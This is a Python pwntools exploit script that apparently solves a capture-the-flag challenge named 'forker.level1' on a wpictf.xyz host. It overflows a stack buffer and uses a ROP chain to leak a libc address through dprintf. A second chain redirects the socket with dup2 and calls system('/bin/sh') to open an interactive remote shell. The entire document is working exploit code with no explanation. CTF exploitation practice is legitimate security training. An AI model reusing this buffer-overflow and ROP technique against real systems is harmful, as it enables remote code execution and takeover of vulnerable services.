from pwn import *
from multiprocessing import Pool

e = ELF('./forker.level1')

pop_rdi = 0x0000000000400c13
pop_rsi_r15 = 0x0000000000400c11

fd = 4

rop = ''.join(map(p64, [
    # Leak puts
    pop_rdi,
    fd,
    pop_rsi_r15,
    e.got['puts'],
    0xdeadbeef,
    e.symbols['dprintf'],

    # jump back to check_password
    pop_rdi,
    fd,
    e.symbols['check_password'],
]))

with remote('forker1.wpictf.xyz', 31339, level='debug') as r:
    r.recvuntil(':')
    r.sendline('A'*0x4c + p32(0x4d) + 'B'*8 + rop)

    puts = u64(r.recvn(6) + '\x00'*2)
    libc = ELF('libc-2.26.so')
    libc.address = puts - libc.symbols['puts']

    print(hex(libc.address))

rop2 = ''.join(map(p64, [
    pop_rdi,
    fd,
    pop_rsi_r15,
    0,
    0xdeadbeef,
    libc.symbols['dup2'],

    pop_rdi,
    fd,
    pop_rsi_r15,
    1,
    0xdeadbeef,
    libc.symbols['dup2'],

    pop_rdi,
    next(libc.search('/bin/sh\x00')),
    libc.symbols['system'],
]))

with remote('forker1.wpictf.xyz', 31339) as r:
    r.recvuntil(':')
    r.sendline('A'*0x4c + p32(0x4d) + 'B'*8 + rop2)

    r.interactive()
